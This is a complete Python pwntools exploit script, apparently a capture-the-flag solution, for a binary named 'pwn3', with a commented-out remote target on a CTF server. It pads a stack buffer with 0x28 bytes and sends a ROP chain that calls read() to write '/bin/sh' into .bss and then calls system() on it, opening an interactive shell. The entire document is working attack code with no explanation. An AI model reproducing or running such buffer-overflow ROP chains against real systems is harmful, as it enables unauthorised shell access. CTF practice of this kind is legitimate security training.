from pwn import *
context.log_level='debug'
context.terminal=['gnome-terminal','-x','sh','-c']

p=process('pwn3')
#p=remote('ctf.nefu.edu.cn',33140)
elf=ELF('./pwn3')
if args.G:
	gdb.attach(p)
	pause()
	
read_plt=elf.plt['read']
system=elf.plt['system']
bss=0x0601080
pop_rdi=0x040063b
pop_rsi=0x040063d
pop_rdx=0x040063f
payload=b'a'*0x28
payload+=p64(pop_rdi)+p64(0)+p64(pop_rsi)+p64(bss)+p64(pop_rdx)+p64(0x8)
payload+=p64(read_plt)+p64(pop_rdi)+p64(bss)+p64(system)
p.recvuntil('want')
p.sendline(payload)
sleep(1)
p.sendline(b'/bin/sh')
p.interactive()
